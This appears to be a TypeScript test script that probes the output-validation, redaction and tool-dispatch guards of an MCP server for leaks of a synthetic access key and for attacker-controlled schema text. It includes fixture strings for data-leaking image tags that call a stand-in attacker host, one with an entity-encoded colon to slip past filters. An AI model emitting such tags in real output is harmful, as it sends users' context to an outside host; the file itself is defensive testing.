import { prepareOutputForPersistence, type GuardResult } from "../../../../src/security/guard";
import { mergeMcpConfig } from "../../../../src/mcp/config";
import { buildDiscovery } from "../../../../src/mcp/discovery";
import { dispatchCallTool, type McpContext } from "../../../../src/mcp/dispatch";
import {
  validateOutputForTransport,
} from "../../../../src/security/output-validation";
import { redactSensitiveText } from "../../../../src/security/redact";
import { validateSerializedOutput } from "../../../../src/security/service";

const syntheticSecret = ["AKIA", "IOSFODNN7EXAMPLE"].join("");
const duplicateKeyJson = `{"metric":"${syntheticSecret}","metric":"safe"}`;
const pass: GuardResult = {
  allowed: true,
  decision: { gate: "pass", action: "allow", findings: [] },
};

const serialized = validateSerializedOutput(duplicateKeyJson);
const persisted = prepareOutputForPersistence(pass, duplicateKeyJson);

const refSibling = validateOutputForTransport({
  format: "json",
  value: "short",
  schema: {
    $defs: { base: { type: "string" } },
    $ref: "#/$defs/base",
    minLength: 20,
  },
});

const attackerSchemaToken = ["attacker", syntheticSecret].join("-");
const attackerSchemaKey = validateOutputForTransport({
  format: "json",
  value: { safe: true },
  schema: { type: "object", [attackerSchemaToken]: true },
});
const attackerSchemaRef = validateOutputForTransport({
  format: "json",
  value: { safe: true },
  schema: { $ref: `https://schemas.invalid/${attackerSchemaToken}` },
});

const optionalUndefined = validateOutputForTransport({
  format: "json",
  value: { id: "safe-id", optional: undefined },
});

const secretPropertyName = validateOutputForTransport({
  format: "json",
  value: { [syntheticSecret]: "safe-value" },
});

const encodedHtmlImage =
  '<img src="https&#58;//attacker.invalid/pixel?payload=context-fragment">';
const srcsetHtmlImage =
  '<img srcset="https://attacker.invalid/pixel?payload=context-fragment 1x">';
const ordinaryLink =
  "[public documentation](https://docs.example.org/guide)";

const mcpContext: McpContext = {
  cwd: process.cwd(),
  config: mergeMcpConfig({ redactToolOutput: false }),
  discovery: buildDiscovery({ modules: { mcp: { enabled: true } as never } }),
  transport: "in-process",
  tools: [
    {
      name: "synthetic.secret-key",
      module: "standard",
      description: "synthetic secret-key output",
      inputSchema: { type: "object" },
      mutating: false,
      invoke: async () => ({ [syntheticSecret]: "safe-value" }),
    },
    {
      name: "synthetic.ref-sibling",
      module: "standard",
      description: "synthetic ref-sibling output",
      inputSchema: { type: "object" },
      outputSchema: {
        $defs: { base: { type: "string" } },
        $ref: "#/$defs/base",
        minLength: 20,
      },
      mutating: false,
      invoke: async () => "short",
    },
  ],
};
const mcpSecretPropertyName = await dispatchCallTool(
  mcpContext,
  "synthetic.secret-key",
  {},
);
const mcpRefSibling = await dispatchCallTool(
  mcpContext,
  "synthetic.ref-sibling",
  {},
);

const output = {
  duplicateKeySerialized: {
    ok: serialized.ok,
    leaked: serialized.text.includes(syntheticSecret),
    redaction: serialized.redaction,
  },
  duplicateKeyPersistence: {
    allowed: persisted.allowed,
    leaked:
      persisted.allowed && persisted.content.includes(syntheticSecret),
  },
  refSibling: {
    ok: refSibling.ok,
    redaction: refSibling.redaction,
  },
  attackerControlledReasons: {
    keyReasonLeaks:
      JSON.stringify(attackerSchemaKey).includes(attackerSchemaToken),
    refReasonLeaks:
      JSON.stringify(attackerSchemaRef).includes(attackerSchemaToken),
    keyRedaction: attackerSchemaKey.redaction,
    refRedaction: attackerSchemaRef.redaction,
  },
  optionalUndefined: {
    ok: optionalUndefined.ok,
    redaction: optionalUndefined.redaction,
  },
  secretPropertyName: {
    ok: secretPropertyName.ok,
    leaked: secretPropertyName.text.includes(syntheticSecret),
    redaction: secretPropertyName.redaction,
  },
  mcpBoundary: {
    secretPropertyNameIsError: mcpSecretPropertyName.isError,
    secretPropertyNameLeaks: mcpSecretPropertyName.text.includes(syntheticSecret),
    secretPropertyNameRedaction: mcpSecretPropertyName.redaction,
    refSiblingIsError: mcpRefSibling.isError,
    refSiblingText: mcpRefSibling.text,
    refSiblingRedaction: mcpRefSibling.redaction,
  },
  autoFetch: {
    encodedHtmlImageChanged:
      redactSensitiveText(encodedHtmlImage) !== encodedHtmlImage,
    srcsetHtmlImageChanged:
      redactSensitiveText(srcsetHtmlImage) !== srcsetHtmlImage,
    ordinaryLinkChanged:
      redactSensitiveText(ordinaryLink) !== ordinaryLink,
  },
};

console.log(JSON.stringify(output, null, 2));
